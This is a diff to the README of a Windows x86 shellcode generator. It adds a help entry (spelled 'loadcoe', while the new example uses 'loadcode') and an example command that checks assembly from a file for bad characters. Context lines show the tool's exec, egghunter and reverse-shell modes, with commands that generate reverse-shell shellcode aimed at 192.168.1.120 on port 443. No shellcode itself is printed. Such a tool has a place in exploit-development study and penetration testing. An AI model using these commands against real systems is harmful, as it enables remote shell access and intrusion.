@@ -16,6 +16,7 @@ positional arguments:
     exec                Generate execute command shellcode
     egghunter           Generate egghunter shellcode
     loadfile            Load shellcode from file
+    loadcoe             Load assembly code from file
 
 options:
   -h, --help            show this help message and exit
@@ -168,3 +169,7 @@ python3 win_x86_shellcoder.py -r reverse -i 192.168.1.120 -p 443
 python3 win_x86_shellcoder.py -r -w reverse -i 192.168.1.120 -p 443
 ```
 
+## Check for bad characters in assembly code from file
+```
+python3 win_x86_shellcoder.py -b '\x00' loadcode -f code.txt
+```
